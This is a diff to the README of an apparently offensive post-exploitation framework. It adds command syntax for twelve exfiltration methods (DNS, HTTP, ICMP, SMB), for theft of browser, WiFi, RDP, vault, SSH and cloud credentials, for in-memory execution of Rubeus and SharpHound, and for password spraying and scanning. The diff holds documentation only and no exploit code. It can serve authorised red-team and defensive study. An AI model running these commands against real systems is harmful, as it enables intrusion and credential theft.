@@ -104,10 +104,20 @@
 - **Mobile evasion** — anti-emulator, anti-Frida, anti-debug, anti-AV (25+ packages)
 
 **Execution**
-- **In-memory BOF** — COFF parser (Windows), memfd_create (Linux)
+- **In-memory BOF** — COFF parser (Windows), memfd_create (Linux), 55+ BOF catalog
+- **.NET assembly execution** — in-memory via PowerShell reflection (Seatbelt, Rubeus, SharpHound, Certify, etc.)
 - **Shellcode execution** — VirtualAlloc/mmap, zero disk footprint
 - **Process injection** — CreateRemoteThread
 - **22 AD commands** — enumeration, Kerberoasting, DCSync, lateral movement
+
+**Initial Access**
+- **Port scanner** — TCP port scan with service detection
+- **Password spray** — SMB-based credential spraying
+- **Network discovery** — ping sweep / nmap host discovery
+- **SMB enumeration** — share listing and access checks
+- **DNS enumeration** — A, MX, NS, TXT, SRV, SOA record queries
+- **Web fingerprinting** — header analysis + common path discovery (robots.txt, .git, .env)
+- **Vulnerability scan** — basic vuln assessment (open ports, SMB signing, common vulns)
 
 **Post-Exploitation**
 - **Token manipulation** — steal, make, revert, impersonate
@@ -119,6 +129,15 @@
 - **Persistence management** — `persist list` to check installed, `persist remove` to clean all
 - **Lateral movement** — wmiexec, winrm, psexec, ssh, pth, wmi-spawn, winrm-spawn
 - **55+ BOF catalog** — AD enum, ADCS, credentials, kerberos, evasion, privesc, networking
+
+**Data Exfiltration (12 methods)**
+- **DNS exfil** — encode data as DNS subdomain queries (stealthy, bypasses firewalls)
+- **HTTP exfil** — POST data to external server (fast)
+- **ICMP exfil** — embed data in ping packets (no TCP/UDP required)
+- **SMB exfil** — copy to network shares
+- **Credential theft** — clipboard, browser passwords, WiFi keys, RDP saved creds, Windows vault
+- **Key discovery** — SSH private keys, AWS/Azure/GCP/Kubernetes credentials, .env files
+- **Data packaging** — compress directories for efficient exfiltration
 
 **Payload Generation (26+ types)**
 - **Agent binaries** — Windows EXE, Linux ELF, garble-obfuscated
@@ -418,15 +437,19 @@ lateral winrm-spawn <target> <user> <pass> <stager_url>
 | Capability | Windows | Linux |
 |-----------|---------|-------|
 | Shell Execution | cmd.exe | /bin/sh |
-| File Upload/Download | Yes | Yes |
+| File Upload/Download | Yes (resumable chunks) | Yes (resumable chunks) |
 | Screenshot | PowerShell GDI | import/scrot/xwd |
 | Process List | tasklist | ps aux |
 | System Info | Full | Full |
-| Persistence | Registry Run Key, Scheduled Task | Cron, Systemd Service, .bashrc |
-| BOF Execution | In-memory COFF loader | memfd_create |
+| Persistence | 7 methods (registry, schtask, startup, WMI, service, logon, COM) | 5 methods (cron, systemd, bashrc, profile, rc.local) |
+| BOF Execution | In-memory COFF loader (55+ catalog) | memfd_create |
+| .NET Assembly | In-memory via reflection | N/A |
 | Shellcode Execution | VirtualAlloc + CreateThread | mmap RWX |
 | Process Injection | CreateRemoteThread | N/A |
 | Sandbox Detection | Yes | Yes |
+| Lateral Movement | wmiexec, winrm, psexec, pth | ssh |
+| Exfiltration | DNS, HTTP, ICMP, SMB, clipboard, browser, WiFi, vault | DNS, HTTP, ICMP, ssh-keys, cloud-keys |
+| Initial Access | portscan, spray, enum-smb, enum-web, vuln-scan | portscan, enum-dns, netdiscover |
 
 ### Active Directory Commands (22 total)
 
@@ -437,6 +460,46 @@ lateral winrm-spawn <target> <user> <pass> <stager_url>
 **Credential Access:** `ad-dump-sam`, `ad-dump-lsa`, `ad-dump-tickets`
 
 **Lateral Movement:** `ad-psexec`, `ad-wmi`, `ad-winrm`, `ad-pass-the-hash`
+
+### Exfiltration Commands
+
+```
+exfil dns <file> <domain>        DNS subdomain tunneling (stealthy)
+exfil http <file> <url>          HTTP POST exfil (fast)
+exfil icmp <file> <target>       ICMP ping data embed (no TCP/UDP)
+exfil smb <file> <share>         SMB file copy
+exfil clipboard                  Steal clipboard
+exfil browser                    Chrome/Firefox credential databases
+exfil wifi                       Saved WiFi passwords
+exfil rdp                        Saved RDP credentials
+exfil vault                      Windows Credential Vault
+exfil ssh-keys                   Find SSH private keys
+exfil cloud-keys                 AWS/Azure/GCP/K8s credentials
+exfil compress <dir> <output>    Compress directory for exfil
+```
+
+### .NET Assembly Execution
+
+```
+assembly Seatbelt.exe -group=all
+assembly Rubeus.exe kerberoast
+assembly SharpHound.exe -c All -d domain.local
+assembly Certify.exe find /vulnerable
+assembly inline <base64_data> [args]
+assembly list
+```
+
+### Initial Access
+
+```
+initaccess portscan <target> <ports>       TCP port scanner
+initaccess spray <target> <users> <pass>   Password spray
+initaccess enum-smb <target>               SMB share enumeration
+initaccess enum-dns <domain> <ns>          DNS record enumeration
+initaccess enum-web <url>                  Web fingerprinting
+initaccess vuln-scan <target>              Vulnerability assessment
+initaccess netdiscover <cidr>              Host discovery
+```
 
 ---
 
